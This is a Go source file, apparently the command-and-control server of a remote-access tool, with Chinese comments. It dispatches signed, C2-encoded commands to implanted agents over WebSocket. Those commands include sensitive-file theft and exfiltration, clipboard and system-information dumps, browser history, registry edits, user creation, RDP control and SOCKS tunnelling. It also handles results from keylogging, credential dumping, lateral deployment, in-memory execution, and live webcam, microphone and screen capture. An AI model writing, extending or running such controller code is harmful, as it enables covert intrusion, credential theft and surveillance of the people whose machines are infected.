// FileUploadChunk 向指定 Agent 发送文件分块
func (h *AgentHub) FileUploadChunk(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "file_upload_chunk", params, "fuc", timeout, "文件分块上传超时")
}

// RegBrowse 向指定 Agent 发送注册表浏览命令
func (h *AgentHub) RegBrowse(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "reg_browse", params, "rb", timeout, "注册表浏览超时")
}

// RegWrite 向指定 Agent 发送注册表写入命令
func (h *AgentHub) RegWrite(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "reg_write", params, "rw", timeout, "注册表写入超时")
}

// RegDelete 向指定 Agent 发送注册表删除命令
func (h *AgentHub) RegDelete(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "reg_delete", params, "rd", timeout, "注册表删除超时")
}

// UserList 向指定 Agent 发送用户列表命令
func (h *AgentHub) UserList(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "user_list", json.RawMessage("{}"), "ul", timeout, "获取用户列表超时")
}

// UserAdd 向指定 Agent 发送添加用户命令
func (h *AgentHub) UserAdd(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "user_add", params, "ua", timeout, "添加用户超时")
}

// UserDelete 向指定 Agent 发送删除用户命令
func (h *AgentHub) UserDelete(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "user_delete", params, "ud", timeout, "删除用户超时")
}

// RdpManage 向指定 Agent 发送 RDP 管理命令
func (h *AgentHub) RdpManage(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "rdp_manage", params, "rm", timeout, "RDP管理超时")
}

// Netstat 向指定 Agent 发送网络状态查询命令
func (h *AgentHub) Netstat(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "netstat", json.RawMessage("{}"), "ns2", timeout, "网络状态查询超时")
}

// SoftwareList 向指定 Agent 发送已安装软件列表命令
func (h *AgentHub) SoftwareList(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "software_list", json.RawMessage("{}"), "sw", timeout, "获取软件列表超时")
}

// BrowserHistory 向指定 Agent 发送浏览器历史查询命令
func (h *AgentHub) BrowserHistory(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "browser_history", json.RawMessage("{}"), "bh", timeout, "浏览器历史查询超时")
}

// FileSteal 向指定 Agent 发送敏感文件扫描命令
func (h *AgentHub) FileSteal(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "file_steal", params, "fs", timeout, "文件扫描超时")
}

// FileExfil 向指定 Agent 发送文件提取命令
func (h *AgentHub) FileExfil(serverID string, params json.RawMessage, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "file_exfil", params, "fe", timeout, "文件提取超时")
}

// ClipboardDump 向指定 Agent 发送剪贴板获取命令
func (h *AgentHub) ClipboardDump(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "clipboard_dump", json.RawMessage("{}"), "cb", timeout, "剪贴板获取超时")
}

// InfoDump 向指定 Agent 发送系统信息收集命令
func (h *AgentHub) InfoDump(serverID string, timeout time.Duration) (string, error) {
	return h.sendAndWait(serverID, "info_dump", json.RawMessage("{}"), "id", timeout, "信息收集超时")
}

// sendAndWait 通用：发送命令并等待结果
func (h *AgentHub) sendAndWait(serverID, msgType string, params json.RawMessage, prefix string, timeout time.Duration, timeoutMsg string) (string, error) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return "", &AgentOfflineError{ServerID: serverID}
	}

	msgID := fmt.Sprintf("%s-%d-%d", prefix, time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))

	resultCh := make(chan *ExecResult, 1)
	agent.pendingMu.Lock()
	agent.pending[msgID] = resultCh
	agent.pendingMu.Unlock()

	defer func() {
		agent.pendingMu.Lock()
		delete(agent.pending, msgID)
		agent.pendingMu.Unlock()
	}()

	msg := h.signMsg(AgentMessage{Type: msgType, ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
		return "", &AgentOfflineError{ServerID: serverID}
	}

	select {
	case result := <-resultCh:
		return result.Output, nil
	case <-time.After(timeout):
		return "", fmt.Errorf(timeoutMsg)
	}
}

// sendNoWait 发送消息但不等待结果（用于 SOCKS 数据转发等高频场景）
func (h *AgentHub) sendNoWait(serverID, msgType string, params json.RawMessage) {
	h.mu.RLock()
	agent, ok := h.agents[serverID]
	h.mu.RUnlock()
	if !ok {
		return
	}
	msgID := fmt.Sprintf("nw-%d-%d", time.Now().UnixNano(), atomic.AddUint64(&msgSeq, 1))
	msg := h.signMsg(AgentMessage{Type: msgType, ID: msgID, Payload: params})
	select {
	case agent.send <- msg:
	default:
	}
}

// RegisterTunnelCallback 注册隧道数据/关闭回调
func (h *AgentHub) RegisterTunnelCallback(channelID string, onData func([]byte), onClose func()) {
	h.tunnelMu.Lock()
	defer h.tunnelMu.Unlock()
	h.tunnelDataCb[channelID] = onData
	h.tunnelCloseCb[channelID] = onClose
}

// UnregisterTunnelCallback 注销隧道回调
func (h *AgentHub) UnregisterTunnelCallback(channelID string) {
	h.tunnelMu.Lock()
	defer h.tunnelMu.Unlock()
	delete(h.tunnelDataCb, channelID)
	delete(h.tunnelCloseCb, channelID)
}

// HandleTunnelBinary 处理从 Agent 收到的隧道二进制帧
// 帧格式: [0x01] [chLen] [channel ASCII] [data]
func (h *AgentHub) HandleTunnelBinary(frame []byte) {
	if len(frame) < 3 || frame[0] != 0x01 {
		return
	}
	chLen := int(frame[1])
	if len(frame) < 2+chLen {
		return
	}
	channelID := string(frame[2 : 2+chLen])
	data := frame[2+chLen:]

	h.tunnelMu.RLock()
	cb := h.tunnelDataCb[channelID]
	h.tunnelMu.RUnlock()
	if cb != nil {
		cb(data)
	}
}

// HandleTunnelClose 处理从 Agent 收到的隧道关闭通知
func (h *AgentHub) HandleTunnelClose(channelID string) {
	h.tunnelMu.RLock()
	cb := h.tunnelCloseCb[channelID]
	h.tunnelMu.RUnlock()
	if cb != nil {
		cb()
	}
}

// signMsgPlain 签名但不做 C2 编码（用于向旧版 agent 发送明文命令）
func (h *AgentHub) signMsgPlain(msg AgentMessage) []byte {
	if len(h.signKey) > 0 {
		msg.Ts = time.Now().Unix()
		raw := msg.Type + "|" + msg.ID + "|" + strconv.FormatInt(msg.Ts, 10) + "|" + string(msg.Payload)
		mac := hmac.New(sha256.New, h.signKey)
		mac.Write([]byte(raw))
		msg.Sig = hex.EncodeToString(mac.Sum(nil))
	}
	data, _ := json.Marshal(msg)
	return data
}

// BroadcastToAgentsPlain 向 agent 发送明文消息（不做 C2 编码，用于升级旧版 agent）
func (h *AgentHub) BroadcastToAgentsPlain(agentMsg AgentMessage, serverIDs []string, platform string) int {
	data := h.signMsgPlain(agentMsg)
	return h.broadcastData(data, serverIDs, platform)
}

// BroadcastToAgents 向指定（或全部）Agent 发送消息，返回成功发送数量
// platform 为空时发给所有平台，否则只发给匹配平台的 Agent
func (h *AgentHub) BroadcastToAgents(agentMsg AgentMessage, serverIDs []string, platform string) int {
	data := h.signMsg(agentMsg)
	return h.broadcastData(data, serverIDs, platform)
}

func (h *AgentHub) broadcastData(data []byte, serverIDs []string, platform string) int {
	h.mu.RLock()
	defer h.mu.RUnlock()

	sent := 0
	failed := 0
	if len(serverIDs) == 0 {
		// 发给所有在线 Agent（按平台过滤）
		for sid, agent := range h.agents {
			if platform != "" && agent.OSType != platform {
				continue
			}
			select {
			case agent.send <- data:
				sent++
			case <-time.After(2 * time.Second):
				failed++
				log.Printf("[BroadcastToAgents] 发送超时: server=%s", sid)
			}
		}
	} else {
		for _, id := range serverIDs {
			if agent, ok := h.agents[id]; ok {
				if platform != "" && agent.OSType != platform {
					continue
				}
				select {
				case agent.send <- data:
					sent++
				case <-time.After(2 * time.Second):
					failed++
					log.Printf("[BroadcastToAgents] 发送超时: server=%s", id)
				}
			}
		}
	}
	if failed > 0 {
		log.Printf("[BroadcastToAgents] 完成: sent=%d failed=%d", sent, failed)
	}
	return sent
}

type AgentOfflineError struct {
	ServerID string
}

func (e *AgentOfflineError) Error() string {
	return "Agent 不在线: " + e.ServerID
}

// HandleAgentWebSocket 处理 Agent 的 WebSocket 连接
func HandleAgentWebSocket(hub *AgentHub, w http.ResponseWriter, r *http.Request, serverID string, osType string) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Agent WebSocket 升级失败: %v", err)
		return
	}

	agent := &AgentConn{
		ServerID:       serverID,
		OSType:         osType,
		conn:           conn,
		send:           make(chan []byte, 512),
		hub:            hub,
		connectedAt:    time.Now(),
		lastActivity:   time.Now(),
		pending:        make(map[string]chan *ExecResult),
		termSessions:   make(map[string]*TermSession),
		screenSessions: make(map[string]*ScreenSession),
		stressSessions: make(map[string]*StressSession),
		micSessions:    make(map[string]*MicSession),
		webcamSessions: make(map[string]*WebcamSession),
	}

	// 注册：新连接直接替换旧连接（仅保留 3 秒冷却防止洪泛）
	hub.mu.Lock()
	if old, ok := hub.agents[serverID]; ok {
		age := time.Since(old.connectedAt)
		if age < 3*time.Second {
			hub.mu.Unlock()
			_ = conn.Close()
			return
		}
		log.Printf("Agent 连接被新连接替换: serverID=%s remote=%s age=%s", serverID, r.RemoteAddr, age.Round(time.Millisecond))

		// 迁移 screenSessions 到新连接（防止前端丢帧）
		old.screenSessionsMu.Lock()
		if len(old.screenSessions) > 0 {
			agent.screenSessionsMu.Lock()
			for sid, ss := range old.screenSessions {
				agent.screenSessions[sid] = ss
				log.Printf("Agent screen session 迁移: serverID=%s session=%s", serverID, sid)
			}
			old.screenSessions = make(map[string]*ScreenSession)
			agent.screenSessionsMu.Unlock()
		}
		old.screenSessionsMu.Unlock()

		// 迁移 webcamSessions 到新连接
		old.webcamSessionsMu.Lock()
		if len(old.webcamSessions) > 0 {
			agent.webcamSessionsMu.Lock()
			for sid, ws := range old.webcamSessions {
				agent.webcamSessions[sid] = ws
			}
			old.webcamSessions = make(map[string]*WebcamSession)
			agent.webcamSessionsMu.Unlock()
		}
		old.webcamSessionsMu.Unlock()

		close(old.send)
		old.conn.Close()
	}
	hub.agents[serverID] = agent
	count := len(hub.agents)
	hub.mu.Unlock()

	log.Printf("Agent 已连接: serverID=%s, 当前在线: %d", serverID, count)

	go agent.writePump()

	// 重连后恢复截图会话：重发 screen_start 命令
	agent.screenSessionsMu.Lock()
	restoreSessions := make(map[string]*ScreenSession, len(agent.screenSessions))
	for sid, ss := range agent.screenSessions {
		restoreSessions[sid] = ss
	}
	agent.screenSessionsMu.Unlock()
	for sid, ss := range restoreSessions {
		payload, _ := json.Marshal(struct {
			FPS     int `json:"fps"`
			Quality int `json:"quality"`
			Scale   int `json:"scale"`
		}{ss.FPS, ss.Quality, ss.Scale})
		msg := hub.signMsg(AgentMessage{Type: "screen_start", ID: sid, Payload: payload})
		select {
		case agent.send <- msg:
			log.Printf("Agent screen session 恢复: serverID=%s session=%s fps=%d", serverID, sid, ss.FPS)
		default:
			log.Printf("Agent screen session 恢复失败（send满）: serverID=%s session=%s", serverID, sid)
		}
	}

	// 重连后恢复摄像头会话：重发 webcam_start 命令
	agent.webcamSessionsMu.Lock()
	restoreWebcam := make(map[string]*WebcamSession, len(agent.webcamSessions))
	for sid, ws := range agent.webcamSessions {
		restoreWebcam[sid] = ws
	}
	agent.webcamSessionsMu.Unlock()
	for sid := range restoreWebcam {
		codec := "h264"
		if restoreWebcam[sid] != nil && restoreWebcam[sid].Codec == "jpeg" {
			codec = "jpeg"
		}
		payload, _ := json.Marshal(struct {
			Codec string `json:"codec"`
		}{Codec: codec})
		msg := hub.signMsg(AgentMessage{Type: "webcam_start", ID: sid, Payload: payload})
		select {
		case agent.send <- msg:
		default:
		}
	}

	agent.readPump() // 阻塞直到断开

	// 断开清理
	hub.mu.Lock()
	if hub.agents[serverID] == agent {
		delete(hub.agents, serverID)
	}
	count = len(hub.agents)
	hub.mu.Unlock()

	// 通知所有等待中的 ExecCommand
	agent.pendingMu.Lock()
	for id, ch := range agent.pending {
		ch <- &ExecResult{ExitCode: -1, Error: "Agent 连接已断开"}
		delete(agent.pending, id)
	}
	agent.pendingMu.Unlock()

	agent.termSessionsMu.Lock()
	termExitCallbacks := make([]func(), 0, len(agent.termSessions))
	for id, ts := range agent.termSessions {
		if ts != nil && ts.OnExit != nil {
			onExit := ts.OnExit
			termExitCallbacks = append(termExitCallbacks, func() {
				onExit(-1)
			})
		}
		delete(agent.termSessions, id)
	}
	agent.termSessionsMu.Unlock()
	for _, cb := range termExitCallbacks {
		cb()
	}

	agent.screenSessionsMu.Lock()
	screenCloseCallbacks := make([]func(), 0, len(agent.screenSessions))
	for id, ss := range agent.screenSessions {
		if ss != nil && ss.OnClose != nil {
			onClose := ss.OnClose
			screenCloseCallbacks = append(screenCloseCallbacks, func() {
				onClose("Agent 连接已断开")
			})
		}
		delete(agent.screenSessions, id)
	}
	agent.screenSessionsMu.Unlock()
	for _, cb := range screenCloseCallbacks {
		cb()
	}

	agent.micSessionsMu.Lock()
	micCloseCallbacks := make([]func(), 0, len(agent.micSessions))
	for id, ms := range agent.micSessions {
		if ms != nil && ms.OnClose != nil {
			onClose := ms.OnClose
			micCloseCallbacks = append(micCloseCallbacks, func() {
				onClose("Agent 连接已断开")
			})
		}
		delete(agent.micSessions, id)
	}
	agent.micSessionsMu.Unlock()
	for _, cb := range micCloseCallbacks {
		cb()
	}

	agent.webcamSessionsMu.Lock()
	webcamCloseCallbacks := make([]func(), 0, len(agent.webcamSessions))
	for id, wcs := range agent.webcamSessions {
		if wcs != nil && wcs.OnClose != nil {
			onClose := wcs.OnClose
			webcamCloseCallbacks = append(webcamCloseCallbacks, func() {
				onClose("Agent 连接已断开")
			})
		}
		delete(agent.webcamSessions, id)
	}
	agent.webcamSessionsMu.Unlock()
	for _, cb := range webcamCloseCallbacks {
		cb()
	}

	log.Printf("Agent 已断开: serverID=%s, 当前在线: %d", serverID, count)
}

func (a *AgentConn) readPump() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("Agent readPump panic: %v", r)
		}
		a.conn.Close()
	}()

	a.conn.SetReadLimit(4 * 1024 * 1024) // 4MB (screen frames can be large)
	a.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	a.conn.SetPongHandler(func(string) error {
		a.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		a.lastActivity = time.Now()
		return nil
	})

	var pendingScreenID string // 等待二进制帧数据的截图会话 ID

	for {
		msgType, data, err := a.conn.ReadMessage()
		if err != nil {
			log.Printf("Agent readPump 退出: serverID=%s, err=%v", a.ServerID, err)
			break
		}
		a.lastActivity = time.Now() // 更新活动时间，防止活跃连接被替换

		// 二进制消息路由
		if msgType == websocket.BinaryMessage {
			// 隧道二进制帧: [0x01] [chLen] [channel] [data]
			if len(data) >= 3 && data[0] == 0x01 {
				a.hub.HandleTunnelBinary(data)
				continue
			}
			// 摄像头帧: [0x02][codec][flags][w_lo][w_hi][h_lo][h_hi][data]
			if len(data) >= 8 && data[0] == 0x02 {
				payload := data[1:] // 转发 codec+flags+w+h+frameData 给前端
				a.webcamSessionsMu.Lock()
				for _, ws := range a.webcamSessions {
					if ws.OnBinary != nil {
						ws.OnBinary(payload)
					}
				}
				a.webcamSessionsMu.Unlock()
				continue
			}
			// 截图 JPEG/H264 帧数据（text+binary pair）
			if pendingScreenID != "" {
				sid := pendingScreenID
				pendingScreenID = ""
				a.screenSessionsMu.Lock()
				if ss, ok := a.screenSessions[sid]; ok && ss.OnBinary != nil {
					ss.OnBinary(data)
				}
				a.screenSessionsMu.Unlock()
				_ = sid
			}
			continue
		}

		var msg AgentMessage
		if err := json.Unmarshal(data, &msg); err != nil {
			continue
		}
		msg.Type = C2d(msg.Type) // C2 协议解码

		switch msg.Type {
		case "exec_result", "quick_cmd_result":
			var result ExecResult
			json.Unmarshal(msg.Payload, &result)
			a.pendingMu.Lock()
			if ch, ok := a.pending[msg.ID]; ok {
				ch <- &result
			}
			a.pendingMu.Unlock()

		case "net_scan_result", "lateral_deploy_result", "cred_dump_result", "chat_dump_result",
			"file_browse_result", "file_download_result", "webcam_snap_result",
			"update_result", "self_update_result", "mem_exec_result",
			"process_list_result", "process_kill_result",
			"window_list_result", "window_control_result",
			"service_list_result", "service_control_result",
			"keylog_result", "keylog_dump_result",
			"webcam_start_result", "webcam_stop_result",
			"mic_start_result", "mic_stop_result",
			// 新增 DLL 功能结果类型
			"screen_input_result",
			"file_upload_result", "file_upload_start_result", "file_upload_chunk_result",
			"reg_browse_result", "reg_write_result", "reg_delete_result",
			"user_list_result", "user_add_result", "user_delete_result",
			"rdp_manage_result",
			"netstat_result",
			"software_list_result",
			"browser_history_result",
			"socks_connect_result",
			"file_steal_result", "file_exfil_result",
			"clipboard_result", "info_dump_result":
			a.pendingMu.Lock()
			if ch, ok := a.pending[msg.ID]; ok {
				ch <- &ExecResult{ExitCode: 0, Output: string(msg.Payload)}
			}
			a.pendingMu.Unlock()

		case "socks_close":
			// Agent 通知隧道关闭
			var closeInfo struct {
				Channel string `json:"channel"`
			}
			json.Unmarshal(msg.Payload, &closeInfo)
			if closeInfo.Channel != "" {
				a.hub.HandleTunnelClose(closeInfo.Channel)
			}

		case "webcam_frame":
			// 旧 base64 兼容（新版 agent 走 0x02 二进制前缀，不经过此分支）
			if len(msg.Payload) > 0 {
				a.webcamFrameMu.Lock()
				a.webcamFrame = string(msg.Payload)
				a.webcamFrameMu.Unlock()
			}

		case "mic_frame":
			// 转发到所有 WebSocket 麦克风流会话
			a.micSessionsMu.Lock()
			for _, ms := range a.micSessions {
				if ms.OnFrame != nil {
					ms.OnFrame(msg.Payload)
				}
			}
			a.micSessionsMu.Unlock()
			// 同时缓存最新一帧（HTTP 轮询兼容）
			a.micFrameMu.Lock()
			a.micFrame = string(msg.Payload)
			a.micFrameMu.Unlock()

		case "pty_started":
			var started struct {
				Mode string `json:"mode"`
			}
			json.Unmarshal(msg.Payload, &started)
			a.termSessionsMu.Lock()
			if ts, ok := a.termSessions[msg.ID]; ok && ts.OnMode != nil {
				ts.OnMode(started.Mode)
			}
			a.termSessionsMu.Unlock()

		case "pty_output":
			var out struct {
				Data string `json:"data"`
			}
			json.Unmarshal(msg.Payload, &out)
			a.termSessionsMu.Lock()
			if ts, ok := a.termSessions[msg.ID]; ok {
				ts.OnOutput(out.Data)
			}
			a.termSessionsMu.Unlock()

		case "pty_exit":
			var ex struct {
				Code int `json:"code"`
			}
			json.Unmarshal(msg.Payload, &ex)
			a.termSessionsMu.Lock()
			if ts, ok := a.termSessions[msg.ID]; ok {
				ts.OnExit(ex.Code)
				delete(a.termSessions, msg.ID)
			}
			a.termSessionsMu.Unlock()

		case "screen_frame":
			pendingScreenID = msg.ID
			a.screenSessionsMu.Lock()
			if ss, ok := a.screenSessions[msg.ID]; ok && ss.OnFrame != nil {
				ss.OnFrame(msg.Payload)
			}
			a.screenSessionsMu.Unlock()

		case "screen_error":
			a.screenSessionsMu.Lock()
			if ss, ok := a.screenSessions[msg.ID]; ok && ss.OnFrame != nil {
				// 转发错误消息到前端
				errPayload, _ := json.Marshal(map[string]interface{}{
					"type":  "screen_error",
					"error": string(msg.Payload),
				})
				ss.OnFrame(errPayload)
			}
			a.screenSessionsMu.Unlock()

		case "stress_progress":
			a.stressSessionsMu.Lock()
			if ss, ok := a.stressSessions[msg.ID]; ok {
				ss.OnProgress(msg.Payload)
			}
			a.stressSessionsMu.Unlock()

		case "stress_done":
			a.stressSessionsMu.Lock()
			if ss, ok := a.stressSessions[msg.ID]; ok {
				ss.OnDone(msg.Payload)
				delete(a.stressSessions, msg.ID)
			}
			a.stressSessionsMu.Unlock()

		case "pong":
			// keepalive 响应，重置读超时
			a.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		}
	}
}

func (a *AgentConn) writePump() {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		a.conn.Close()
	}()

	for {
		select {
		case msg, ok := <-a.send:
			a.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				a.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			if err := a.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
				return
			}
			// 批量发送 channel 中积压的消息，减少系统调用
			n := len(a.send)
			for i := 0; i < n; i++ {
				extra, ok := <-a.send
				if !ok {
					return
				}
				if err := a.conn.WriteMessage(websocket.TextMessage, extra); err != nil {
					return
				}
			}

		case <-ticker.C:
			a.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := a.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
